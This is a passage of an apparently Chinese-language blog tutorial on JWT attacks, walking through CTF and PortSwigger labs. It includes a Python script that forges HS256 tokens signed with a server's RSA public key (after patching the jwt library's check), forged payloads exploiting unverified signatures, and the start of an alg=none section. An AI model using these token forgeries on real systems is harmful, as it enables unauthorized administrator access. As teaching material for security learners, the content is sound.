single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'POST'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$FLAG</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$jwt_payload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string single-quoted-string\">'role'</span><span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">JWTHelper</span><span class=\"token operator\">::</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$jwt_payload</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PRIVATE_KEY</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'RS256'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$jwt_payload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n                <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string single-quoted-string\">'role'</span><span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">'guest'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">JWTHelper</span><span class=\"token operator\">::</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$jwt_payload</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PRIVATE_KEY</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'RS256'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        @<span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"token\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$token</span><span class=\"token punctuation\">,</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1800</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Location: /index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        @<span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"token\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Location: /index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token class-name static-context\">JWTHelper</span><span class=\"token operator\">::</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PUBLIC_KEY</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$obj</span> <span class=\"token operator\">=</span> <span class=\"token class-name static-context\">JWTHelper</span><span class=\"token operator\">::</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$PUBLIC_KEY</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token operator\">-></span><span class=\"token property\">role</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$FLAG</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>简单的看一下，大致意思就是当以用户名为<code>admin</code>，密码不是<code>$flag</code>时，此时登录后JWT中<code>payload</code>的<code>role</code>是<code>guest</code>，而只有当<code>role</code>为<code>admin</code>时才能够得到Flag，所以我们这里肯定是需要伪造JWT的，我们先以<code>admin</code>为用户名，随便输入密码登录一下<br>此时得到JWT，将其拿去解密网站<a href=\"https://jwt.io/\">https://jwt.io</a>解密一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152836.png\" alt=\"在这里插入图片描述\"><br>发现加密方式是RS256非对称加密，想到在登录时，下方给出了公钥<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152844.png\" alt=\"在这里插入图片描述\"><br>所以这里就可以尝试更改算法为<code>HS256</code>，以公钥作为密钥来进行签名和验证，因此我们构造一个伪造JWT的脚本，内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">import jwt\nimport base64\n\n<span class=\"token keyword\">public</span> <span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token string double-quoted-string\">\"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqizf1rnxqfeyCAp52TQO\n3uEyeB1HzqqbO8FBHWqLlhgmyPFqaopXVhZryzP+Sd6a3iQd8xeD7URswPHE4roA\nkbI1GMta9zAdD1yPtp//JNZ55hx1iFY2n9gw2u8VL64n9sCc56H46L3W52Z37kvW\nq5LuoLAuyJpP7Ofadt7biWaeXibZGQjPwlbCy31DyxdDFCt8pVrajVI97w3amHBU\nXhd0Ku+DOq9hjadtQbTkbIkAUR84yqt+25EXd/rg1w8we9ysNcTjAeUayRGPuQmX\nUWJaFpsvuL7WeUb2xJqvieFwsCQppS1ZgaoRc0F835K+G3s3qWRi4AnvZxryfTzl\nawIDAQAB\n-----END PUBLIC KEY-----\n\"</span><span class=\"token string double-quoted-string\">\"\"</span>\npayload<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span> <span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"role\"</span><span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>jwt<span class=\"token operator\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> key<span class=\"token operator\">=</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">,</span> algorithm<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'HS256'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时运行完后发现报错<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152204.png\" alt=\"在这里插入图片描述\"><br>这个是因为源代码中进行了校验，我们简单设置一下即可,源代码文件地址如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>python3<span class=\"token operator\">/</span>dist<span class=\"token operator\">-</span>packages<span class=\"token operator\">/</span>jwt<span class=\"token operator\">/</span>algorithms<span class=\"token operator\">.</span>py<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>我们在它的校验前面增加这样一句话</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">invalid_strings<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152274.png\" alt=\"在这里插入图片描述\"><br>此时保存退出，再运行文件即可得到新JWT<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152225.png\" alt=\"在这里插入图片描述\"><br>将新的JWT拿到网站中替换旧的JWT，刷新网站即可得到flag<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152264.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"未验证签名\"><a href=\"#未验证签名\" class=\"headerlink\" title=\"未验证签名\"></a>未验证签名</h2><p>当用户端提交请求给应用程序，服务端可能没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制，此时就造成了越权漏洞的出现。<br>假设现有payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span> \n  <span class=\"token string\">\"iat\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1668871293</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"exp\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1668878493</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"nbf\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1668871293</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"sub\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"quan9i\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的<code>quan9i</code>是普通用户，按理说的话它是无法访问到管理员的界面的，但由于这里的签名是没有验证的，当我们修改<code>payload</code>时，这个JWT仍然有效，所以我们修改payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span> \n  <span class=\"token string\">\"iat\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1668871293</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"exp\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1668878493</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"nbf\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1668871293</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"sub\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时就垂直越权，变成了管理员用户，可以访问管理员的界面。</p>\n<h3 id=\"靶场演示-2\"><a href=\"#靶场演示-2\" class=\"headerlink\" title=\"靶场演示\"></a>靶场演示</h3><p>题目环境<a href=\"https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature\">https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature</a><br>题目描述</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>本实验使用基于 JWT 的机制来处理会话。由于实施缺陷，服务器不会验证它收到的任何 JWT 的签名。</p></blockquote>\n<p>题目要求</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>要解决实验室问题，请修改您的会话令牌以获取对管理面板的访问权限/admin，然后删除用户carlos。</p></blockquote>\n<p>题目条件</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>您可以使用以下凭据登录到您自己的帐户：wiener:peter</p></blockquote>\n<p>打开环境后发现Cookie中没什么东西，但想到题目给出了账号，那就先找登录点，发现有个<code>My account</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152303.png\" alt=\"在这里插入图片描述\"><br>点击查看，发现是登录界面，将刚刚题目条件中所给的用户名和密码放入<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152331.png\" alt=\"在这里插入图片描述\"><br>此时查看cookie<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152705.png\" alt=\"在这里插入图片描述\"><br>具体内容为</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\"><span class=\"token namespace\">eyJraWQiOiIxYmE5NjA0Ny0wNjBiLTQ0MTAtODg1NC01YWYxYTQ2ZTljYWEiLCJhbGciOiJSUzI1NiJ9<span class=\"token punctuation\">.</span>eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTI5NzgxMH0<span class=\"token punctuation\">.</span></span>JMb3Ttl7WLoVrTfcEq03VIafh7zDMu5_nhMtPc3qnhgENSl1WbMAMFfeTa</span><span class=\"token operator\">-</span>v0jS69A13W<span class=\"token operator\">-</span><span class=\"token class-name\">J3_ccslHu25OW_SRPAq2GuAUoFfEGtthnP</span><span class=\"token operator\">-</span><span class=\"token class-name\">PaDWFN2_UIIcaeAx8rj8bNy65apX37EnTx</span><span class=\"token operator\">-</span>sPo274XjW9hQgTRLT1ifHtfihvTzoOY94_2bLaR4JwSUoyoi_kXZW4IndvhqpHA2kn8jw2aQOJCCCjeHh2r_CDDQA1hrSKeP2FgIq07wagLZqzkG6ATexINTNI_4jwpO8Jy1U<span class=\"token operator\">-</span>l0voPQQ6g111GCkBDhhkCagnm4zh<span class=\"token operator\">-</span>_Kl2nDD<span class=\"token operator\">-</span><span class=\"token class-name\">Xjp74VVZDCNojbLoeS2Y6RGPZ4GR28w</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>对第一个<code>.</code>后和第二个<code>.</code>之前的内容进行解码（此部分内容为有效载荷）<br>得到</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"iss\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"portswigger\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sub\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"wiener\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"exp\"</span><span class=\"token operator\">:</span><span class=\"token number\">1669297810</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>题目提示了这里不校验签名，所以我们修改payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"iss\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"portswigger\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sub\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"administrator\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"exp\"</span><span class=\"token operator\">:</span><span class=\"token number\">1669297810</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>再对其进行<code>Base64URL</code>编码，替换掉原来的<code>payload</code>，此时就得到了新的JWT，将新的JWT放入<code>session</code>中，重新访问此界面，发现多了一个功能点<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152750.png\" alt=\"在这里插入图片描述\"><br>发现可以删除用户<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152758.png\" alt=\"在这里插入图片描述\"><br>任务完成。<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130152783.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"空加密算法\"><a href=\"#空加密算法\" class=\"headerlink\" title=\"空加密算法\"></a>空加密算法</h2><p>这里需要先介绍一些利用的知识点</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>将signature置空。利用node的jsonwentoken库已知缺陷：当jwt的signature为null或undefined时，jsonwebtoken会采用algorithm为none进行验证</p></blockquote>\n<p>JWT支持使用空加密算法，可以在header中指定<code>alg</code>为<code>none</code>，此时只要把<code>signature</code>设置为空，提交到服务器，任何token都可以通过服务器的验证。</p>\n<p>假设现有JWT(解码后的，无<code>signature</code>的)如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"alg\"</span> <span class=\"token operator\">:</span> <span class=\"token 